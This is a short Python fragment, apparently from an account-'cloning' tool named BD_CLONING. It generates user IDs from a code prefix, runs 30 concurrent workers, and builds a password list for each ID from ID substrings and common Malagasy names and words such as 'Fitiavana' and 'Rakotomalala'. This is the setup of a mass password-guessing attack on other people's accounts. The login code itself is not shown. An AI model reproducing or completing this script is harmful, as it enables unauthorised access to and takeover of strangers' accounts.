...
def BD_CLONING():
    ...
    with tred(max_workers=30) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'vadiko','Vadiko','mamako','Mamako','mamiko','Mamiko','malalako','Malalako','Malala','malala','fitiavana','Fitiavana','milely','Milely','fanomezana','Fanomezana','Fiderana','fiderana','Nantenaina','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','fandresena','Fandresena','Nirina','nilaina','Nilaina','nirina']
